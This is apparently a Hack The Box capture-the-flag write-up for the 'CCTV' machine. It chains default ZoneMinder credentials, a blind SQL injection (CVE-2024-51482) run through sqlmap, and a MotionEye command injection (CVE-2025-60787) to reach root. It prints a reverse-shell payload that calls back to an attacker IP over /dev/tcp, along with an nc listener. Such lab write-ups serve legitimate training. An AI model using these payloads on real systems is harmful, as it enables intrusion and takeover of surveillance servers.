# Machine: CCTV (Hack The Box)

## Enumeration

I started by scanning the target machine's ports to discover open services.

<img width="687" height="70" alt="nmap" src="https://github.com/user-attachments/assets/cf71ecba-a9c5-4cc3-8bbd-ceddca5ced16" />

SSH and HTTP services were found running. I proceeded to enumerate the web application.

On the web app, I found a login page for the **ZoneMinder** service.

<img width="721" height="438" alt="login" src="https://github.com/user-attachments/assets/05f7db1f-6cff-48ee-8d16-eb1d71720653" />

Default credentials `admin:admin` granted access to the dashboard.

Once logged in, I identified that ZoneMinder was running version **1.37.63**, which is vulnerable to a **Boolean-based SQL Injection — CVE-2024-51482**.

## Exploitation

The vulnerability exists in the `web/ajax/event.php` endpoint within the `removetag` function, where the `tid` parameter is directly concatenated into the SQL query without proper sanitization or parameterization.

The vulnerable endpoint can be interacted with via:

```
http://target/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]
```

I used **sqlmap** to automate the exploitation. The tool performed a blind SQL injection attack, extracting database names, table names, and data based on the database's conditional responses.

sqlmap successfully retrieved the password hashes for users **mark** and **superadmin**.

<img width="646" height="101" alt="sqlmap" src="https://github.com/user-attachments/assets/71bbc96f-6426-43dc-aa67-d5cde3489c99" />

Using **John the Ripper**, I cracked **mark**'s password hash and used the credentials to connect to the target via SSH.

<img width="656" height="607" alt="ssh" src="https://github.com/user-attachments/assets/52f533d1-f43d-49df-81f2-786ab2e129df" />

## Privilege Escalation

Using `ss -tlnp`, I discovered that **MotionEye** was running locally on port **8765**. To access it, I set up port forwarding to my local machine.

```bash
ssh -L 8765:127.0.0.1:8765 mark@ip
```

I found the MotionEye credentials in the configuration file `/etc/motioneye/motion.conf`.

<img width="510" height="258" alt="motioneye" src="https://github.com/user-attachments/assets/46306088-c9ce-48ce-8ea2-73048d028933" />

MotionEye is vulnerable to **RCE via CVE-2025-60787**. It allows arbitrary strings in the `image_file_name` field, which are written directly into `/etc/motioneye/camera-*.conf` and interpreted as shell commands.

First, I disabled the client-side validation that prevented shell characters from being entered in the image filename field (this validation only exists on the client side).

<img width="452" height="199" alt="javascript" src="https://github.com/user-attachments/assets/42cf6727-a6bf-4638-944d-cf7b11aaaeb0" />

I then injected the following reverse shell payload into the field:

```bash
$(python3 -c 'import os;os.system("bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"")').%Y-%m-%d-%H-%M-%S
```

<img width="1242" height="823" alt="reverse shell" src="https://github.com/user-attachments/assets/1dfe25d7-4caa-45c1-99c2-6a3dc7605481" />

I set up a listener on port 4444.

```bash
nc -lvnp 4444
```

When a snapshot was triggered, the reverse shell executed and I received a **root shell**, successfully retrieving both the user flag and the root flag.

<img width="316" height="51" alt="user flag" src="https://github.com/user-attachments/assets/818e8ef8-1697-470a-8494-7c3ad2ff6a38" />

<img width="386" height="46" alt="root flag" src="https://github.com/user-attachments/assets/226404c4-be4f-443c-9e52-fa34c70bbcb1" />
